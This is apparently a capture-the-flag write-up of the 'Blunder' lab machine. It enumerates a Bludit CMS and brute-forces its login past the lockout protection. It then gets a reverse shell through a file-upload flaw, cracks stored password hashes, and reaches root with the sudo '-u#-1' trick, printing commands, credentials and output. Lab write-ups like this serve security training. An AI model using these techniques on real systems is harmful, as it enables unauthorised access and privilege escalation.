# Blunder writeup

## Services
```bash
└─$ nmap -sC -sV -p 21,80 -oA nmap/tcp-script $IP                                                                     
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-27 16:49 EDT
Nmap scan report for 10.129.95.225
Host is up (0.054s latency).

PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Blunder | A blunder of interesting facts
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: Blunder

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.00 seconds
```
This server only currently has 1 service open and its an HTTP server.
Launchpad suggests its Ubuntu **Focal**

## HTTP
The website is a blog running on the CMS `bludit`. Based on the versions of the css and js files used, I'm inferring that its `bludit 3.9.2`
```html
<link rel="stylesheet" type="text/css" href="http://10.129.95.225/bl-kernel/css/bootstrap.min.css?version=3.9.2">
<link rel="stylesheet" type="text/css" href="http://10.129.95.225/bl-kernel/admin/themes/booty/css/bludit.css?version=3.9.2">
<link rel="stylesheet" type="text/css" href="http://10.129.95.225/bl-kernel/admin/themes/booty/css/bludit.bootstrap.css?version=3.9.2">

	<!-- Javascript -->
	<script src="http://10.129.95.225/bl-kernel/js/jquery.min.js?version=3.9.2"></script>
<script src="http://10.129.95.225/bl-kernel/js/bootstrap.bundle.min.js?version=3.9.2"></script>
```
With directory enumeration we discover the `/todo.txt` which reveals the username `fergus`
```bash
└─$ ~/go/bin/gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php    
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.95.225
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
2023/07/27 16:52:04 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/about                (Status: 200) [Size: 3290]
/0                    (Status: 200) [Size: 7573]
/admin                (Status: 301) [Size: 0] [--> http://10.129.95.225/admin/]
/install.php          (Status: 200) [Size: 30]
/robots.txt           (Status: 200) [Size: 22]
/todo.txt             (Status: 200) [Size: 118]
/usb                  (Status: 200) [Size: 3969]
/LICENSE              (Status: 200) [Size: 1083]
```
`/admin` is a login page

## Github
This CMS is available on GitHub and we can take a look at the changelog for v3.10.0 to find the vulnerabilities to aim for.

There are two that pique our interest as one bypasses bruteforce protection and the other gives us RCE.
The **bruteforce protection** uses the `X-FORWARDED-BY` header to get try to get the IP of the client. We control this value, so as long as it's changed on each request our attempts will bypass. There is a script from searchsploit we can use that will do this for us.

I tried brute forcing with `rockyou.txt`, but it didn't work so I tried this cewl tool, `cewl`. It uses the words found in the page source to create a custom wordlist.
```bash
└─$ cewl $IP > wordlist.txt
```

Using this wordlist with the username found earlier, we successfully bruteforce login creds.
```bash
└─$ python bruteBludit.py -l http://10.129.95.225/admin/ -u user.txt -p ../wordlist.txt
[*] Bludit Auth BF Mitigation Bypass Script by ColdFusionX
[p] Brute Force: Testing -> fergus:RolandDeschain

[*] SUCCESS !!
[+] Use Credential -> fergus:RolandDeschain
```
Now that we have access we can attack the file upload vuln.
There are 2 issues in the changelog about RCE via file upload. I am going to use the first one #1079. In this issue a file is first uploaded to a `/tmp` directory and then a file extension check is done. If the file a gif, png, jpg, jpeg, or svg it is then moved to the right location. But if it isn't one of those file types it isn't deleted, it's just left in the `/tmp` directory, which we use directory traversal to get to.

Now this file won't execute on it's own, since the .htaccess file from the root of the project denies it. However, we can do perform the same file upload, but with a new .htaccess file to override the rule.

Both of these uploads are done in `burp` because there is front end and backend validation. So we select a file meeting the extension type and then change the name in burp's `intercept`.

After both files have been uploaded we can traverse to the `/tmp` folder by going to `http://10.129.95.225/bl-content/tmp/php-reverse-shell.php` and we catch the reverse shell.

## privEsc - Hugo
There are 2 buldit directories in the `/var/www` path, which is probably what the todo.txt note was referencing with updating the CMS. In both of these paths we have databases for the user accounts and they differ. In `bludit-3.9.2` there is an entry for `fergus` and `admin`. I'm not able to crack the `admin` hash.
```bash
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Admin",
        "firstName": "Administrator",
        "lastName": "",
        "role": "admin",
        "password": "bfcc887f62e36ea019e3295aafb8a3885966e265",
        "salt": "5dde2887e7aca",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""
    },
    "fergus": {
        "firstName": "",
        "lastName": "",
        "nickname": "",
        "description": "",
        "role": "author",
        "password": "be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7",
        "salt": "jqxpjfnv",
        "email": "",
        "registered": "2019-11-27 13:26:44",
        "tokenRemember": "9981dc4d54e8130d021c9999f30094fa",
        "tokenAuth": "0e8011811356c0c5bd2211cba8c50471",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "codepen": "",
        "instagram": "",
        "github": "",
        "gitlab": "",
        "linkedin": "",
        "mastodon": ""
    }
```
In the other path `bludit-3.10.0a` the database contains only one user entry and its for `hugo` who also has an account on this machine. I cracked this hash with hashcat and it gave me creds to `hugo:Password120`
```bash
www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
```
## privEsc - shaun
hugo has sudo privilege to create a shell as any user except `root`
```bash
hugo@blunder:/ftp$ sudo -l
Password:
Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
```
```bash
hugo@blunder:/home$ sudo -u shaun /bin/bash
shaun@blunder:/home$ whoami
shaun
```

## privEsc - root

**hold on a sec...** Let's go back to hugo and look at that sudo permission again.
```bash
hugo@blunder:/home$ sudo --version
Sudo version 1.8.25p1
Sudoers policy plugin version 1.8.25p1
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.25p1
```
This sudo version is vulnerable to an underflow vulnerability. Even tho we can't specify `root`, we can specify the id of the user we want. 
```bash
hugo@blunder:/home$ sudo -u#-1 bash
root@blunder:/home#
```
-1 evaluates to 0 and then executes the command as uid 0 or `root`
